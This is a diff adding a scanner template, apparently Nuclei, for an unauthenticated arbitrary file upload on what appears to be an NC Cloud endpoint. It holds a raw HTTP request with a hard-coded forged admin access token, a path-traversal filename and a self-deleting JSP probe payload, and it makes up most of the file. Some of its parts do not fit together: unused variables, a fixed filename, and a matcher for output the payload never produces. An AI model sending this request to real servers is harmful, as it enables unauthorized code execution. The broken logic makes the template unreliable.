@@ -1,0 +1,73 @@
+id: file-upload
+
+info:
+  name: file-upload
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    该产品存在任意文件上传，未经身份验证的攻击者可通过此漏洞获取服务器权限。
+  reference:
+    - 
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 
+    cvss-score: 9.5
+    cwe-id: CWE-434
+  metadata:
+    date: 
+    version: 
+    fofa-query: 
+  tags: fileupload,rce
+
+# ==================
+#       文件上传
+# ==================
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "file error"
+  pay1: '<?php echo 11*11;unlink(__FILE__);'
+
+
+http:
+  - raw:
+      - |-
+        POST /nccloud/mob/pfxx/manualload/importhttpscer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        accessToken: eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA
+        Content-Length: 266
+        Content-Type: multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0
+
+        --fd28cb44e829ed1c197ec3bc71748df0
+        Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/141172.jsp"
+
+        <%out.println(11*11);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --fd28cb44e829ed1c197ec3bc71748df0--
+
+      - |
+        GET {{url}}/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+  
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "success")'
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "121")'
+          - 'contains(body_2, "c4ca4238a0b923820dcc509a6f75849b")'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body_1
+        name: url
+        internal: true
+        group: 1
+        regex:
+          - "(/files/upload/[^\"]*)"
